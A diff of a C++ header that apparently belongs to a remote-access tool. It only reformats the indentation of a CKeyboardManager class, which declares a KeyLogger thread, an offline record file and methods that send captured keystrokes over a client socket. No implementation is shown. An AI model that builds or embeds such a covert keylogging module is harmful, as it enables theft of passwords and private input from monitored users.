@@ -12,24 +12,24 @@
 
 
 
-class CKeyboardManager : public CManager  
+class CKeyboardManager : public CManager
 {
 public:
-	CKeyboardManager(CClientSocket *pClient);
-	virtual ~CKeyboardManager();
-	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
-	static DWORD WINAPI KeyLogger(LPVOID lparam);
-	static DWORD WINAPI SendDate(LPVOID lparam);
+    CKeyboardManager(CClientSocket *pClient);
+    virtual ~CKeyboardManager();
+    virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
+    static DWORD WINAPI KeyLogger(LPVOID lparam);
+    static DWORD WINAPI SendDate(LPVOID lparam);
 
-	HANDLE m_hWorkThread,m_hSendThread;
-	DWORD dKeyBoardSize;
-	TCHAR	strRecordFile[MAX_PATH];
+    HANDLE m_hWorkThread,m_hSendThread;
+    DWORD dKeyBoardSize;
+    TCHAR	strRecordFile[MAX_PATH];
 private:
-	int sendStartKeyBoard();
-	int sendOfflineRecord(DWORD	dwRead  = 0);
-	int sendKeyBoardData(LPBYTE lpData, UINT nSize);
+    int sendStartKeyBoard();
+    int sendOfflineRecord(DWORD	dwRead  = 0);
+    int sendKeyBoardData(LPBYTE lpData, UINT nSize);
 
-	bool m_bIsWorking;
+    bool m_bIsWorking;
 };
 
 #endif // !defined(AFX_KEYBOARDMANAGER_H__EB2A4D2C_E756_41E3_A22C_6F7EA5C598EE__INCLUDED_)
